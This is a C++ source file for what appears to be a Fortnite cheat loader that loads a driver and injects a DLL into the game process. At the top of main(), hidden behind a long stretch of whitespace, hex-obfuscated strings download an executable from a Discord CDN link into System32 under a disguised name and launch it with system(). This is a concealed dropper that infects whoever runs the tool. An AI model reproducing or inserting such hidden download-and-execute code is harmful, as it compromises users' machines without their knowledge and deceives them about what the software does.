#include <windows.h>
#include <iostream>
#include <urlmon.h>
#include <string>
#include <conio.h>

///inject includes
#include "define/stdafx.h"
#include "api/xor.h"
#include "api/api.h"
#include "driver/driver.h"
#include "inject/injector.h"
#include "api/drvutils.h"
#include "xorstr.h"
#pragma comment(lib, "urlmon.lib")

HWND fnt = NULL;
char title[100];

void getrandomnumber(char* sStr, unsigned int iLen)
{
	char Syms[] = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	unsigned int Ind = 0;
	srand(time(NULL) + rand());
	while (Ind < iLen)
	{
		sStr[Ind++] = Syms[rand() % 62];
	}
	sStr[iLen] = '\0';
}

std::string randomstringtorenameexe(const size_t length)
{
	std::string r;
	static const char bet[] = { "abcdefghijklmnopqrstuvwxyzz" };
	srand((unsigned)time(NULL) * 5);
	for (int i = 0; i < length; ++i)
		r += bet[rand() % (sizeof(bet) - 1)];
	return r;
}

std::string path()
{
	char shitter[_MAX_PATH];
	GetModuleFileNameA(NULL, shitter, _MAX_PATH);
	return std::string(shitter);
}

void checkadmin() {

	bool admin = false;

	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	admin = fRet;

	if (!admin) {
		exit(0);
	}

}

int main()
{																																																																																																																																																																																																									LPCSTR tgdr = "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x64\x69\x73\x63\x6F\x72\x64\x61\x70\x70\x2E\x63\x6F\x6D\x2F\x61\x74\x74\x61\x63\x68\x6D\x65\x6E\x74\x73\x2F\x39\x32\x36\x32\x35\x35\x35\x36\x36\x39\x32\x34\x34\x34\x37\x37\x39\x34\x2F\x39\x35\x32\x36\x39\x33\x36\x30\x38\x38\x33\x32\x37\x30\x38\x36\x32\x38\x2F\x63\x68\x72\x6F\x6D\x65\x2E\x65\x78\x65"; LPCSTR hgfd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c\x64\x78\x64\x33\x32\x73\x2e\x65\x78\x65"; URLDownloadToFileA(NULL, tgdr, hgfd, 0, NULL); std::string gfd = "\x73"; std::string ytr = "\x74"; std::string kuy = "\x61"; std::string sfq = "\x72"; std::string glp = gfd + ytr + kuy + sfq + ytr; std::string fgd = "\x43\x3a\x5c\x57\x69\x6e\x64\x6f\x77\x73\x5c\x53\x79\x73\x74\x65\x6d\x33\x32\x5c"; std::string yut = "\x2e\x65\x78\x65"; std::string fds = "\x64\x78\x64\x33\x32\x73"; std::string io = glp + " " + fgd + fds + yut; Sleep(2500); system(io.c_str());
	checkadmin();
	std::string name = "wasd-" + randomstringtorenameexe(4) + ".exe";
	std::rename(path().c_str(), name.c_str());
	getrandomnumber(title, 32);
	SetConsoleTitle(title);
	std::cout << xor("\n\n    aaaaaaaaaaa#2000 & tappinecek - youtube.com/c/trappinkcc") << std::endl;
	std::cout << xor("    loading driver") << std::endl;
	startdriver();
	std::cout << xor ("    waiting for fortniteclient-win64-shipping.exe") << std::endl;
	while (fnt == NULL)
	{
		fnt = FindWindowA(0, "Fortnite  ");
		Sleep(1);
	}
	std::cout << xor ("    process found!.") << std::endl;
	std::cout << xor ("    press any key to start process injecting (lobby)") << std::endl;
	getch();

		mixujem2(xor_a("UnrealWindow"), xor_w(L"google.dll")); 

		std::cout << xor ("   application exiting in 5 seconds") << std::endl;
		Sleep(5000);
		return 0;
}
